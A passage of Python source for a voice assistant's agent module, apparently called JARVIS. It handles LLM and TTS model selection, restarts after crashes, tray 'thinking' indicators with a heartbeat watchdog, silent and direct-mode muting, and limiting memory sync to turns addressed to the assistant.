        "action succeeded. Apply the POST-HANDOFF HONESTY rule from "
        "your instructions: hedge with 'I tried but couldn't confirm — "
        "want me to check?' or similar. Never voice 'I've opened…' / "
        "'Done.' / 'X is now Y' for this turn.]"
    )
    try:
        chat_ctx.items.append(
            ChatMessage(role="system", content=[marker_text])
        )
    except Exception:
        # Test environments may use a minimal stub for ChatMessage
        # (e.g. SimpleNamespace chat_ctx). Fall back to a tiny shim
        # with the same .role / .content attrs the production message
        # exposes.
        class _StubMsg:
            def __init__(self, role: str, content: list[str]) -> None:
                self.role = role
                self.content = content

        chat_ctx.items.append(_StubMsg("system", [marker_text]))
    # Clear the flag — single-shot marker per refusal event. (The
    # subagents.agent._clear_handoff_refused helper was removed in the
    # subagent teardown; clear the session attr directly. This whole
    # path is dormant without subagents — the flag is never set — but
    # kept so a later subagent re-port can reuse the marker injection.)
    try:
        session._jarvis_last_handoff_refused = False
    except Exception:
        pass


# Auth / billing / quota errors a restart can NEVER heal — bouncing the
# voice-client just re-hits the same wall and loops forever (2026-07-01:
# an Anthropic "credit balance too low" 400 spun the client in an infinite
# restart loop for hours). Recoverability AND the explicit user-facing wording
# ("I'm out of credits on Claude") both come from the shared provider-error
# classifier (pipeline.provider_errors), so there's one source of truth.


def _active_voice_model() -> "str | None":
    """Best-effort read of the pinned voice model (``~/.jarvis/voice-model``),
    used to sharpen provider detection in error messages. None if unreadable."""
    try:
        return (Path.home() / ".jarvis" / "voice-model").read_text(
            encoding="utf-8"
        ).strip() or None
    except Exception:
        return None


_ERR_NOTIFY_TS = [0.0]  # boxed: throttle provider-error desktop notifications


def _notify_error(classified, *, min_interval: float = 60.0) -> None:
    """Throttled desktop notification for a classified provider error, so the
    user SEES what broke ('out of credits on Claude') instead of nothing."""
    now = time.time()
    if now - _ERR_NOTIFY_TS[0] < min_interval:
        return
    _ERR_NOTIFY_TS[0] = now
    try:
        import subprocess as _sp
        _sp.Popen(
            ["notify-send", "-u", "critical", "-t", "10000",
             classified.notify_title, classified.notify_body],
            stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
        )
    except Exception:
        pass  # notify-send absent / headless — the log line is the fallback


def _session_close_needs_restart(ev) -> bool:
    """True if the CloseEvent is a crash a voice-client restart can heal.

    A non-None error normally means the AgentSession died and a fresh room
    + dispatch recovers it (a transient STT / network blip). But an
    auth/billing/quota error is NOT healed by a restart — the fresh session
    hits the same wall and we loop. Recoverability is decided by
    ``classify_provider_error(...).recoverable``; the fix for those is credits
    or a provider switch (``~/.jarvis/voice-model``), not a bounce.
    """
    err = getattr(ev, "error", None)
    if err is None:
        return False  # clean shutdown (model switch, tray quit)
    return classify_provider_error(err, model=_active_voice_model()).recoverable


async def _restart_voice_client_after_crash() -> None:
    """3-second debounce then restart jarvis-voice-client via systemd.

    Called by _on_session_close when AgentSession dies with a non-None error.
    The voice client's _agent_presence_watchdog handles room deletion and
    fresh dispatch — we only need to trigger the restart.

    Routed through pipeline.service_control.restart_service so the same
    call site works on Linux today (systemctl --user) and lights up on
    Windows once Phase 3 ships the nssm backend. ``ServiceControlError``
    is caught + logged here — there's no useful recovery if service
    control is unwired, and the crash-restart path mustn't itself crash.
    """
    await asyncio.sleep(3)
    from pipeline.service_control import restart_service, ServiceControlError
    try:
        restart_service("jarvis-voice-client")
    except ServiceControlError as e:
        logger.warning("[restart-after-crash] service control unavailable: %s", e)


# ── CLI model selection ────────────────────────────────────────────────
# The system tray exposes 5 CLI-model choices (mirroring the CLI's own
# /model picker — DeepSeek×2, Groq×3). The user's pick is written to
# this file; run_jarvis_cli reads it on every spawn and exports the
# matching JARVIS_PROVIDER + JARVIS_MODEL env vars to the CLI
# subprocess. So switching takes effect on the very next tool call —
# no restart needed.
#
# The voice agent's OWN conversational LLM stays on Groq llama-3.3-70b
# regardless. That's a latency optimisation and not surfaced to the
# user — the tray controls only the CLI's model.
CLI_MODEL_FILE   = Path.home() / ".jarvis" / "cli-model"
DEFAULT_CLI_MODEL = "deepseek-v4-pro"

# ── Speech (voice) LLM selection ──────────────────────────────────────
#
# The voice-side LLM composes spoken replies and decides when to call
# tools. Switchable via the tray's "Models" submenu — chosen ID is
# written to ~/.jarvis/voice-model. Switching DOES require a quick
# agent restart (~5 s amber) because AgentSession's LLM is built
# once at session start; we can't hot-swap it like the CLI tool model.
# voice-client triggers the systemctl restart on POST /voice-model.
#
# Defaults to llama-3.3-70b on Groq for low first-token latency
# (~200 ms). Other options trade latency for capability.
#
# Extracted 2026-05-10 (Step 5e of the 10/10 refactor):
#   - _read_unified_setting → pipeline.settings.read_unified_setting
#   - SPEECH_MODEL_FILE / DEFAULT_SPEECH_MODEL / SPEECH_MODELS /
#     read_speech_model / make_speech_llm → providers.llm
# Re-exported under the legacy names so the in-file call sites
# (entrypoint, SPEECH_MODELS read for telemetry, CLI-model reader)
# keep working unchanged.
from pipeline.settings import read_unified_setting as _read_unified_setting
from providers.llm import (
    SPEECH_MODEL_FILE,
    DEFAULT_SPEECH_MODEL,
    SPEECH_MODELS,
    read_speech_model,
    make_speech_llm,
)

# TTS provider switching — written by the tray via /tts-provider on
# the voice client. Format: "<provider>:<voice>", e.g. "groq:troy".
# Only `groq:<voice>` is accepted post-2026-05-01 (ElevenLabs removed).
TTS_PROVIDER_FILE = Path.home() / ".jarvis" / "tts-provider"


# Extracted to providers/llm.py 2026-05-10 (Step 5d of the 10/10
# refactor). Re-exported under the legacy underscored name so the one
# in-file caller (entrypoint() at ~line 4630) is untouched.
from providers.llm import build_dispatching_llm as _build_dispatching_llm
from providers.llm import wrap_pin_fallback as _wrap_pin_fallback

# Extracted to providers/tts.py 2026-05-10 (Step 6 of the 10/10
# refactor). The chain builder takes the TTS_PROVIDER_FILE path as
# an arg so providers/tts.py doesn't reach back into jarvis_agent
# for the constant.
from providers.tts import (
    build_tts_chain as _providers_build_tts_chain,
    build_dispatching_tts as _build_dispatching_tts,
)


def _build_tts_chain() -> list:
    """Back-compat wrapper around `providers.tts.build_tts_chain`
    that passes this module's `TTS_PROVIDER_FILE` constant."""
    return _providers_build_tts_chain(TTS_PROVIDER_FILE)


# The voice-side STT/TTS labels — kept here so the dynamic system-
# prompt builder can tell the user the full stack on demand.
VOICE_STT_LABEL = "Whisper Large v3 Turbo (on-device faster-whisper)"
VOICE_TTS_LABEL = (
    f"Kokoro on-device (voice {os.getenv('JARVIS_LOCAL_TTS_VOICE', 'af_heart')}), "
    f"with Edge-TTS ({os.getenv('JARVIS_EDGE_VOICE', 'en-US-GuyNeural')}) as fallback"
)

# Whitelist of CLI model IDs surfaced in the tray, with the
# (provider, upstream_model) pair each maps to. IDs match the CLI's
# JARVIS_MODEL_DEFINITIONS in jarvisModelRegistry.ts. Order = display
# order in the tray.
CLI_MODELS: dict[str, dict] = {
    "deepseek-chat": {
        "provider": "deepseek",
        "model":    "deepseek-chat",
        "label":    "DeepSeek · chat",
    },
    "deepseek-reasoner": {
        "provider": "deepseek",
        "model":    "deepseek-reasoner",
        "label":    "DeepSeek · reasoner",
    },
    "deepseek-v4-flash": {
        "provider": "deepseek",
        "model":    "deepseek-v4-flash",
        "label":    "DeepSeek · v4 flash",
    },
    "deepseek-v4-pro": {
        "provider": "deepseek",
        "model":    "deepseek-v4-pro",
        "label":    "DeepSeek · v4 pro",
    },
    "qwen/qwen3-32b": {
        "provider": "groq",
        "model":    "qwen/qwen3-32b",
        "label":    "Groq · qwen3-32b",
    },
    "qwen/qwen3.6-27b": {
        "provider": "groq",
        "model":    "qwen/qwen3.6-27b",
        "label":    "Groq · qwen3.6-27b",
    },
    "llama-3.3-70b-versatile": {
        "provider": "groq",
        "model":    "llama-3.3-70b-versatile",
        "label":    "Groq · llama 3.3 70B",
    },
    "meta-llama/llama-4-scout-17b-16e-instruct": {
        "provider": "groq",
        "model":    "meta-llama/llama-4-scout-17b-16e-instruct",
        "label":    "Groq · llama 4 scout",
    },
    "openai/gpt-oss-120b": {
        "provider": "groq",
        "model":    "openai/gpt-oss-120b",
        "label":    "Groq · gpt-oss-120b",
    },
    # Anthropic Claude — three tiers mirroring the Claude Code /model
    # picker. Provider name 'anthropic' matches the CLI-side entry in
    # src/cli/src/utils/model/jarvisModelRegistry.ts; the upstream
    # model IDs are passed verbatim. CLI subprocess gets the proxy
    # via ANTHROPIC_BASE_URL=http://localhost:4000 from _cli_env.
    # Must stay in sync with CLI_MODELS_AVAILABLE in
    # voice_client_tray_config.py (the tray-side whitelist).
    "claude-opus-4-7": {
        "provider": "anthropic",
        "model":    "claude-opus-4-7",
        "label":    "Anthropic · Claude Opus 4.7",
    },
    "claude-opus-4-8": {
        "provider": "anthropic",
        "model":    "claude-opus-4-8",
        "label":    "Anthropic · Claude Opus 4.8",
    },
    "claude-sonnet-4-6": {
        "provider": "anthropic",
        "model":    "claude-sonnet-4-6",
        "label":    "Anthropic · Claude Sonnet 4.6",
    },
    "claude-haiku-4-5": {
        "provider": "anthropic",
        "model":    "claude-haiku-4-5",
        "label":    "Anthropic · Claude Haiku 4.5",
    },
    # OpenAI GPT-5 family — added 2026-05-17 after live-failure
    # "unknown CLI model 'gpt-5.1', falling back to deepseek-v4-pro"
    # (deepseek-v4-pro is retired per commit 1f9e1ff4). Provider name
    # 'openai' matches the CLI-side entry in
    # src/cli/src/utils/model/jarvisModelRegistry.ts; the upstream
    # model IDs are passed verbatim. CLI subprocess gets the proxy
    # via JARVIS_PROXY_URL → http://localhost:4000 from _cli_env.
    # Must stay in sync with CLI_MODELS_AVAILABLE in
    # voice_client_tray_config.py (the tray-side whitelist).
    "gpt-5-nano": {
        "provider": "openai",
        "model":    "gpt-5-nano",
        "label":    "OpenAI · GPT-5 nano",
    },
    "gpt-5-mini": {
        "provider": "openai",
        "model":    "gpt-5-mini",
        "label":    "OpenAI · GPT-5 mini",
    },
    "gpt-5": {
        "provider": "openai",
        "model":    "gpt-5",
        "label":    "OpenAI · GPT-5",
    },
    "gpt-5.1": {
        "provider": "openai",
        "model":    "gpt-5.1",
        "label":    "OpenAI · GPT-5.1",
    },
    "gpt-5-pro": {
        "provider": "openai",
        "model":    "gpt-5-pro",
        "label":    "OpenAI · GPT-5 pro",
    },
    # Kimi K2.6 — all four UI modes hit the same upstream API model
    # `kimi-k2.6`. The Instant/Thinking/Agent/Swarm split is a
    # client-side preset (system prompt + tools), not a separate API.
    # Verified live via /v1/models 2026-05-04. K2.6 returns a separate
    # `reasoning_content` field; the consuming dispatch path must
    # strip it before TTS (mirror the existing deepseek_roundtrip
    # pattern when wiring Kimi as a voice-LLM inner — today the tray
    # picker just selects which model the speech-LLM dispatcher uses).
    "kimi-k2.6-instant": {
        "provider": "kimi",
        "model":    "kimi-k2.6",
        "label":    "Kimi · K2.6 Instant",
    },
    "kimi-k2.6-thinking": {
        "provider": "kimi",
        "model":    "kimi-k2.6",
        "label":    "Kimi · K2.6 Thinking",
    },
    "kimi-k2.6-agent": {
        "provider": "kimi",
        "model":    "kimi-k2.6",
        "label":    "Kimi · K2.6 Agent",
    },
    "kimi-k2.6-swarm": {
        "provider": "kimi",
        "model":    "kimi-k2.6",
        "label":    "Kimi · K2.6 Swarm",
    },
}


def read_cli_model() -> str:
    """Return the active CLI model ID, or the default if unset/invalid.

    Reads the flat file written by the tray UI under `~/.jarvis/`
    (the unified-settings SDK is a thin wrapper over that file —
    there is no SQLite settings store). Runtime turn telemetry lives
    separately in `~/.local/share/jarvis/turn_telemetry.db`."""
    name = _read_unified_setting("cli-model", CLI_MODEL_FILE)
    if name in CLI_MODELS:
        return name
    if name:
        logger.warning(
            f"unknown CLI model {name!r}, falling back to {DEFAULT_CLI_MODEL}"
        )
    return DEFAULT_CLI_MODEL


# Prompt cribbed from the existing speech.ts voice-channel prompt.
# Kept short on purpose — voice replies should sound conversational,
# not enumerate bullet points. The Tier 1 / Tier 3 rules and the
# "replies are spoken aloud" constraints are the load-bearing bits.
# Extracted to prompts/supervisor.md 2026-05-10 — content-team-friendly
# (markdown editing without Python edits / test runs / redeploys).
# Loaded once at import; immutable thereafter. Per-turn dynamic blocks
# (memory_block / learned_rules_block / breaker_status_block) are
# appended at update_instructions time in entrypoint().
_PROMPTS_DIR = Path(__file__).parent / "prompts"
# Fallback mirrors load_soul's DEFAULT_SOUL pattern: a missing/unreadable
# supervisor.md must NOT crash the worker at import (a corrupted checkout
# or bad permissions would otherwise wedge every restart with a bare
# traceback). Degrade to a minimal ops prompt and log loudly instead.
_DEFAULT_SUPERVISOR_INSTRUCTIONS = (
    "You are JARVIS, a voice-first assistant. Reply concisely and "
    "conversationally. Use your tools for concrete, nameable actions; "
    "for ambiguous or emotional input, just reply. Never read tool-call "
    "syntax aloud."
)
try:
    JARVIS_INSTRUCTIONS = (_PROMPTS_DIR / "supervisor.md").read_text(encoding="utf-8")
except Exception as _e:
    logger.error(
        f"[boot] could not read prompts/supervisor.md ({_e}); "
        f"falling back to minimal built-in instructions. Restore the file."
    )
    JARVIS_INSTRUCTIONS = _DEFAULT_SUPERVISOR_INSTRUCTIONS


# ── Tool bridge: delegate tool-using turns to the full JARVIS CLI ────
#
# The LiveKit agent by itself is a pure STT→LLM→TTS pipeline — no
# access to bash, files, web, MCP, or any of the tool surface the
# jarvis-cli process exposes. The old sidecar (speech.ts's `runAgent`)
# bridged this by spawning the CLI as a subprocess when the user's
# text matched a "needs tools" regex. We replicate the same pattern
# here, but exposed as a LiveKit `function_tool` so the LLM decides
# when to invoke it rather than a server-side regex. Avoids the
# regex's false positives ("what TIME is best to deploy" ≠ needs
# tools) and gives the LLM context to phrase the reply naturally.

JARVIS_CLI_SCRIPT = os.environ.get(
    "JARVIS_CLI_SCRIPT",
    str(Path.home() / "Documents/Projects/jarvis/src/cli/scripts/start.sh"),
)
# Default 120 s (was 60 s). Multi-step design / refactor work
# routinely needs 60-90 s end-to-end on deepseek-v4-pro; the lower
# default was killing turns mid-write and leaving the planner
# subagent with no concrete result to summarise. Override via
# env when you want a different cap.
JARVIS_CLI_TIMEOUT_S = int(os.environ.get("JARVIS_CLI_TIMEOUT_S", "120"))

# Tool-busy flag file. Tools write a small token file at start and
# remove it at end; the voice-client polls its mtime + presence on
# /status so the desktop tray can show "thinking" amber for the
# full duration of a long-running tool call (run_jarvis_cli can
# take 10-15 s; without this signal the inferred-thinking TTL gives
# up after 12 s and the tray flickers back to green even though
# JARVIS is still working).
_TOOL_BUSY_FILE = Path.home() / ".jarvis" / ".tool-running"


def _mark_tool_start(name: str) -> None:
    try:
        _TOOL_BUSY_FILE.parent.mkdir(parents=True, exist_ok=True)
        _TOOL_BUSY_FILE.write_text(f"{name}\n{int(time.time())}\n", encoding="utf-8")
    except Exception as _e:
        # Tray-busy indicator file write — non-fatal; tray will fall
        # back to inferred-thinking detection. Log at DEBUG so a real
        # FS / permission bug is still observable when needed.
        logger.debug(f"[tool-busy] write failed: {_e}")


def _mark_tool_end() -> None:
    try:
        _TOOL_BUSY_FILE.unlink(missing_ok=True)
    except Exception as _e:
        logger.debug(f"[tool-busy] unlink failed: {_e}")


# Definitive "agent is thinking" signal. Touched the moment STT
# finalizes a user turn (= LLM is about to start generating), removed
# when the assistant turn is committed (= TTS already played, agent's
# done). Replaces the desktop's prior heuristic of inferring thinking
# from listening→quiet transitions, which had a false-positive on
# every ambient mic trigger that VAD picked up.
_AGENT_THINKING_FILE = Path.home() / ".jarvis" / ".agent-thinking"


def _mark_thinking_start() -> None:
    try:
        _AGENT_THINKING_FILE.parent.mkdir(parents=True, exist_ok=True)
        _AGENT_THINKING_FILE.write_text(
            str(int(time.time())), encoding="utf-8",
        )
    except Exception as _e:
        logger.debug(f"[agent-thinking] write failed: {_e}")


def _mark_thinking_end() -> None:
    try:
        _AGENT_THINKING_FILE.unlink(missing_ok=True)
    except Exception:
        pass


# Heartbeat-driven thinking-indicator (2026-05-27). Replaces the
# agent_state_changed-driven file management which broke during long
# turns: the framework transitioned through "listening" or "speaking"
# between tool calls, the file got unlinked, indicator went green
# while JARVIS was actively reviewing/researching for the user.
#
# The heartbeat task starts on user_input_transcribed(is_final=True)
# and runs until the assistant emits a FINAL reply (text content, no
# tool_use) or until the turn is interrupted/cancelled. While running,
# it re-touches _AGENT_THINKING_FILE every `interval_s` seconds — the
# desktop's 60s TTL becomes a generous floor instead of the operative
# expiry.
async def _thinking_heartbeat(interval_s: float = 3.0, *, session=None) -> None:
    """Touch _AGENT_THINKING_FILE every `interval_s` seconds.

    On cancellation, unlinks the file so the desktop indicator goes
    green immediately. Idempotent: external unlinks are repaired on
    the next tick.

    Orphan watchdog (2026-05-30): when `session` is given, the heartbeat
    ALSO self-cancels if no genuine turn progress (`_bump_turn_activity`:
    user input / tool batch / assistant reply) has landed for
    `_thinking_max_idle_s()` AND no tool is running. This is the
    agent_state-INDEPENDENT backstop: the idle/listening cancel
    (`_schedule_idle_heartbeat_cancel`) only fires when the framework
    cleanly transitions to idle, but a turn can wedge agent_state at
    "speaking"/"thinking" (live 2026-05-30: a non-interruptible TTS whose
    playout never completed left the heartbeat orphaned for minutes). The
    tool-busy guard keeps a long `run_jarvis_cli` from clearing early."""
    max_idle = _thinking_max_idle_s()
    try:
        while True:
            if session is not None:
                last = getattr(session, "_jarvis_last_turn_activity", None)
                if (last is not None
                        and (time.monotonic() - last) > max_idle
                        and not _TOOL_BUSY_FILE.exists()):
                    logger.info(
                        f"[heartbeat] self-cancelled: no turn progress for "
                        f"{max_idle:.0f}s, no tool running (orphan guard)"
                    )
                    _mark_thinking_end()
                    return
            _mark_thinking_start()
            await asyncio.sleep(interval_s)
    except asyncio.CancelledError:
        _mark_thinking_end()
        raise


def _start_thinking_heartbeat(session, interval_s: float = 3.0) -> None:
    """Start (or restart) the heartbeat task on this session. Any prior
    task is cancelled defensively — handles back-to-back user inputs
    that arrive faster than the previous turn-end."""
    prior = getattr(session, "_jarvis_thinking_heartbeat", None)
    if prior is not None and not prior.done():
        prior.cancel()
    _bump_turn_activity(session)  # fresh progress clock for the new turn
    try:
        session._jarvis_thinking_heartbeat = asyncio.create_task(
            _thinking_heartbeat(interval_s=interval_s, session=session)
        )
    except Exception as _e:
        logger.debug(f"[heartbeat] start failed: {_e}")
        session._jarvis_thinking_heartbeat = None


def _cancel_thinking_heartbeat(session) -> None:
    """Cancel the heartbeat task on this session if running. Idempotent."""
    task = getattr(session, "_jarvis_thinking_heartbeat", None)
    if task is None:
        return
    if not task.done():
        task.cancel()
    session._jarvis_thinking_heartbeat = None


# Grace before the agent_state-idle backstop cancels the thinking
# heartbeat (see _on_agent_state). The normal cancel lives in _on_item
# (final-reply detection), but a turn can end with NO final assistant
# item — e.g. the framework logs "skipping reply to user input, current
# speech generation cannot be interrupted" (live 2026-05-30) — and then
# _on_item never fires, so the heartbeat keeps re-touching the flag every
# 3s and the tray's amber "thinking" sticks forever. If the agent settles
# into idle/listening and STAYS there this long, the turn is truly over.
# Generous enough to ignore the framework's transient sub-second
# "listening" between tool calls; short enough that a leak self-heals.
def _thinking_idle_grace_s() -> float:
    try:
        v = float(os.environ.get("JARVIS_THINKING_IDLE_GRACE_S", "5.0"))
        return v if v > 0 else 5.0
    except (TypeError, ValueError):
        return 5.0


# Hard ceiling for the heartbeat's orphan watchdog (see _thinking_heartbeat):
# if a turn produces NO progress (_bump_turn_activity) for this long and no
# tool is running, the heartbeat self-cancels even if agent_state never went
# idle. Generous so it rarely clears during a long legit turn; the fast path
# for normal turns is the 5s idle backstop. Bounds a wedged-state leak to this
# instead of forever.
#   CAVEAT: the tool-busy guard (~/.jarvis/.tool-running) only covers
#   `run_jarvis_cli` — that's the only tool calling `_mark_tool_start`. A
#   `computer_use` / `dispatch_agent` call that runs past this ceiling emits no
#   interim agent-side event and sets no tool-busy flag, so the watchdog WILL
#   fire mid-turn and flip the indicator green while JARVIS is still working
#   (cosmetic; self-heals on the next real event). FOLLOW-UP: have those two
#   tools call `_mark_tool_start`/`_mark_tool_end` to close this gap.
def _thinking_max_idle_s() -> float:
    try:
        v = float(os.environ.get("JARVIS_THINKING_MAX_IDLE_S", "120.0"))
        return v if v > 0 else 120.0
    except (TypeError, ValueError):
        return 120.0


def _bump_turn_activity(session) -> None:
    """Record genuine turn progress for the heartbeat's orphan watchdog.
    Called on user input, tool-batch execution, and assistant replies —
    NOT on raw agent_state changes (which can flap during a wedge and keep
    a dead turn's heartbeat alive). Idempotent / failure-silent."""
    try:
        session._jarvis_last_turn_activity = time.monotonic()
    except Exception:
        pass


def _schedule_idle_heartbeat_cancel(session) -> None:
    """Backstop cancel for the thinking heartbeat. If the agent settles
    into idle/listening and STAYS there past `_thinking_idle_grace_s()`,
    the turn is over — cancel the heartbeat so the tray stops showing
    amber. A return to thinking/speaking aborts the pending task via
    `_cancel_pending_idle_heartbeat_cancel`. Covers turns that end with no
    final assistant item (the framework skips the reply when the current
    speech can't be interrupted), which `_on_item` never sees. Idempotent:
    no-op if the heartbeat isn't running or a cancel is already pending."""
    hb = getattr(session, "_jarvis_thinking_heartbeat", None)
    if hb is None or hb.done():
        return
    prior = getattr(session, "_jarvis_thinking_idle_cancel_task", None)
    if prior is not None and not prior.done():
        return

    async def _idle_cancel(_sess=session):
        try:
            await asyncio.sleep(_thinking_idle_grace_s())
            if getattr(_sess, "agent_state", "") in ("idle", "listening"):
                _cancel_thinking_heartbeat(_sess)
                logger.info(
                    "[heartbeat] cancelled after sustained idle "
                    "(turn ended with no final assistant reply)"
                )
        except asyncio.CancelledError:
            pass

    try:
        session._jarvis_thinking_idle_cancel_task = asyncio.create_task(_idle_cancel())
    except Exception as _e:
        logger.debug(f"[heartbeat] idle-cancel schedule skipped: {_e}")


def _cancel_pending_idle_heartbeat_cancel(session) -> None:
    """Abort a pending idle backstop-cancel — the turn resumed
    (thinking/speaking), so the heartbeat must keep running. Idempotent."""
    t = getattr(session, "_jarvis_thinking_idle_cancel_task", None)
    if t is not None and not t.done():
        t.cancel()
    session._jarvis_thinking_idle_cancel_task = None


# Per-turn tool-call governor. Without this, the LLM can chain
# run_jarvis_cli calls indefinitely — observed: misinterpreted user
# question → CLI #1 ran for 24 s → LLM chained CLI #2 ("fix the
# auto-update script") → another 24 s — while the user sat there
# waiting and asking "what's going on?". Cap chains so JARVIS has
# to TALK to the user after one tool round-trip unless they
# explicitly ask for a multi-step plan.
_TURN_TOOL_CALL_LIMIT = 2
_tool_calls_this_turn = 0


def _reset_tool_call_count() -> None:
    global _tool_calls_this_turn
    _tool_calls_this_turn = 0


# Silent-mode flag. When present, the agent suppresses replies to
# everything EXCEPT wake-up phrases ("wake up", "come back",
# "unmute"). This is a SOFT mute — the mic stays on so JARVIS can
# hear the wake-up; only TTS output is suppressed. Distinct from
# the hardware /mute endpoint on the voice-client which physically
# mutes the LiveKit local audio track (and would prevent JARVIS
# from hearing "wake up" entirely).
_SILENT_MODE_FILE = Path.home() / ".jarvis" / ".silent-mode"
# Active conversation mode (written by bin/jarvis-mode): "jarvis" | "gemini" |
# "openai". In a DIRECT mode (gemini/openai) the active voice is a separate
# process (jarvis-gemini-tools/jarvis-gpt-tools) — the Claude agent here is NOT
# the voice the user hears and must stay fully silent, NOT just mic-muted.
# Without this, Claude's proactive say() paths (cron digest, background-task
# announcements, reconnect lines) voice OVER the direct model → the user hears
# two voices / "Jarvis started talking" in Gemini mode.
_ACTIVE_MODE_FILE = Path.home() / ".jarvis" / "active-mode"


# Direct-mode units. A direct mode is only TRULY active when its backend
# process is alive — a stale active-mode file (the tool was killed/crashed
# without `jarvis-mode jarvis`) must NOT keep Claude dormant forever.
_DIRECT_UNITS = {
    "gemini": "jarvis-gemini-tools.service",
    "openai": "jarvis-gpt-tools.service",
}
_DIRECT_LIVE_TTL_S = 2.0      # cache the systemctl probe (called on the turn path)
_DIRECT_LIVE_GRACE_S = 20.0   # ride out a transient restart gap (GoAway → RestartSec=2)
_direct_live_cache: dict = {"mode": "", "ts": 0.0, "live": False, "last_live": 0.0}


def _direct_unit_live(mode: str) -> bool:
    """True iff the direct-mode backend for `mode` is actually running.

    Cached for a couple seconds with a short GRACE window so a legitimate
    backend restart (Gemini/OpenAI send a GoAway every ~10-15min → clean exit
    → RestartSec=2 ~7s gap) doesn't read as dead and let Claude talk over the
    resuming direct voice ('two voices'). Fail SAFE: if systemctl can't be
    probed, assume LIVE — preserving the direct-mode mute is more important
    than the wedge auto-recovery.
    """
    unit = _DIRECT_UNITS.get(mode)
    if not unit:
        return False
    now = time.monotonic()
    c = _direct_live_cache
    if c["mode"] == mode and (now - c["ts"]) < _DIRECT_LIVE_TTL_S:
        live = c["live"]
    else:
        try:
            rc = _subprocess.run(
                ["systemctl", "--user", "is-active", "--quiet", unit],
                timeout=2,
            ).returncode
            live = rc == 0
        except Exception:
            return True
        c.update(mode=mode, ts=now, live=live)
        if live:
            c["last_live"] = now
    if live:
        return True
    return c["mode"] == mode and (now - c["last_live"]) < _DIRECT_LIVE_GRACE_S


def _direct_mode_active() -> bool:
    # A direct mode (Gemini/OpenAI) owns the voice ONLY when its backend is
    # alive. A stale active-mode file (the tool died without `jarvis-mode
    # jarvis`) must NOT keep Claude dormant forever — auto-recover by treating
    # a dead direct mode as not-active (the deaf+mute wedge, 2026-06-13).
    try:
        mode = _ACTIVE_MODE_FILE.read_text(encoding="utf-8").strip()
    except Exception:
        return False
    return mode in ("gemini", "openai") and _direct_unit_live(mode)


def _is_silent() -> bool:
    # Silent when the user muted (flag file) OR a direct mode owns the voice
    # (Claude is dormant — see _direct_mode_active). Both routes suppress every
    # gated Claude TTS path: reactive turns (on_user_turn_completed) and the
    # proactive watchers (cron digest, background-task announcements).
    return _SILENT_MODE_FILE.exists() or _direct_mode_active()


def _set_silent(on: bool) -> None:
    try:
        _SILENT_MODE_FILE.parent.mkdir(parents=True, exist_ok=True)
        if on:
            _SILENT_MODE_FILE.write_text("on\n", encoding="utf-8")
        else:
            _SILENT_MODE_FILE.unlink(missing_ok=True)
    except Exception:
        pass


# Directed-only memory sync (2026-07-02). With the reply addressing gate
# deliberately OFF on this box (always-answer room, 2026-06-25), honcho
# was fed EVERY overheard utterance — bystander chatter became derived
# "facts" (the fabricated "session with Zhaleh — she was watching
# football" person). Memory applies a STRICTER bar than replying: only
# turns explicitly addressed to JARVIS (vocative / wake phrase), or
# within a short continuation window of one, are synced.
# `_last_real_interaction` can't serve as the window stamp here — it is
# touched by every ACCEPTED turn, and with the reply gate off, ambient
# turns keep it warm forever. This stamp is touched only by addressed
# turns (and refreshed by synced follow-ups, so a live directed exchange
# keeps syncing; ponytail: refresh means a directed exchange that drifts
# ambient rides until a 120s lull — the vocative entry bar is the filter).
MEMORY_SYNC_DIRECTED_ONLY = (
    os.environ.get("JARVIS_MEMORY_SYNC_DIRECTED_ONLY", "1") != "0"
)
MEMORY_SYNC_WINDOW_SEC = float(
    os.environ.get("JARVIS_MEMORY_SYNC_WINDOW_SEC", "120")
)
_last_addressed_interaction = 0.0


def _touch_addressed() -> None:
    global _last_addressed_interaction
    _last_addressed_interaction = time.monotonic()


def _within_addressed_window() -> bool:
    return (time.monotonic() - _last_addressed_interaction) < MEMORY_SYNC_WINDOW_SEC


def _should_sync_memory_item(role: str, text: str) -> bool:
    """Whether a conversation item should be synced to the cloud memory
    provider (honcho).

    Skips non-user/assistant roles and empty text; skips entirely while
    JARVIS is silenced (2026-06-18 silent-mode token-leak fix, spec:
    docs/superpowers/specs/2026-06-18-silent-mode-token-leak-fix-design.md);
    and — 2026-07-02 — skips anything not directed at JARVIS (see the
    directed-only block above). Kill-switch:
    JARVIS_MEMORY_SYNC_DIRECTED_ONLY=0 restores sync-everything.
    """
    if role not in ("user", "assistant"):
        return False
    if not (text or "").strip():
        return False
    if _is_silent():
        return False
    if not MEMORY_SYNC_DIRECTED_ONLY:
        return True
    if role == "user" and (
        _JARVIS_NAME_RE.search(text) or _is_command(text, _WAKE_PATTERNS)
    ):
        _touch_addressed()
        return True
    if _within_addressed_window():
        _touch_addressed()  # a live directed exchange keeps syncing
        return True
    return False


# Wake/mute voice-command matching lives in pipeline/voice_commands.py
# (extracted 2026-06-18) so the voice-client's local wake-listener and this
# agent share ONE source of truth. Aliased to the historical _-prefixed names
# so existing call sites + tests (test_short_input_gate imports _is_command/
# _WAKE_PATTERNS/_MUTE_PATTERNS) stay untouched. Spec:
# docs/superpowers/specs/2026-06-18-silent-mode-token-leak-fix-design.md
from pipeline.voice_commands import (
    MUTE_PATTERNS as _MUTE_PATTERNS,
    WAKE_PATTERNS as _WAKE_PATTERNS,
    WAKE_STRICT_PATTERNS as _WAKE_STRICT_PATTERNS,
    MEDIA_OBJECT_RE as _MEDIA_OBJECT_RE,
    SENTENCE_SPLIT_RE as _SENTENCE_SPLIT_RE,
    COMMAND_MAX_WORDS as _COMMAND_MAX_WORDS,
    is_command as _is_command,
)


# ── Short-input ambiguity gate ────────────────────────────────────────
# Extracted to pipeline/short_input_gate.py 2026-05-10 (Step 3 of the
# 10/10 refactor). The gate was inverted 2026-05-10 (3rd-fix-pivot)
# from broad bypass-regex matching to an explicit blocklist of known
# confab-trigger utterances; the old ALLOWLIST_RE / INTERROGATIVE_BYPASS_RE
# / KILL_PHRASE_BYPASS_RE re-exports are gone with them.
from pipeline.short_input_gate import (
    is_ambiguous_short_input as _is_ambiguous_short_input,
)


# Soul loader — prompts/soul.md becomes slot #1 of the supervisor
# system prompt. See pipeline/prompt_builder.py::load_soul. (The
# rule-evolution / learned_rules subsystem that previously lived here
# was removed 2026-05-20 — see the self-improvement-rebuild spec.)
from pipeline.prompt_builder import (
    load_soul             as _load_soul,
)

# JARVIS's primary identity (slot #1 of the supervisor system prompt).
# Lives in prompts/soul.md — the editable identity/voice layer, decoupled
# from the operational rules in supervisor.md (JARVIS_INSTRUCTIONS).
